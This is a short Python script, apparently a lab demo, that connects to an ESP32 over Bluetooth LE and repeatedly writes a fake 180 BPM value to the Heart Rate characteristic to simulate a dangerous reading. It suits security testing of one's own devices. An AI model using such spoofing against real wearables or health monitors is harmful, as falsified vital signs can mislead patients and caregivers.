import asyncio
from bleak import BleakClient

# Replace with your ESP32's MAC address
TARGET_ADDRESS = "2C:BC:BB:4C:A0:EA"

# Heart Rate Characteristic UUID (from your ESP32 code)
HEART_RATE_UUID = "00002a37-0000-1000-8000-00805f9b34fb"

async def run():
    async with BleakClient(TARGET_ADDRESS) as client:
        if client.is_connected:
            print("Connected! Flooding heart rate characteristic every 5 seconds...")

            while True:
                fake_bpm = b"180"  # Simulate dangerously high heart rate
                await client.write_gatt_char(HEART_RATE_UUID, fake_bpm)
                print(f"Wrote fake heart rate: {fake_bpm.decode()} BPM")
                await asyncio.sleep(5)

asyncio.run(run())

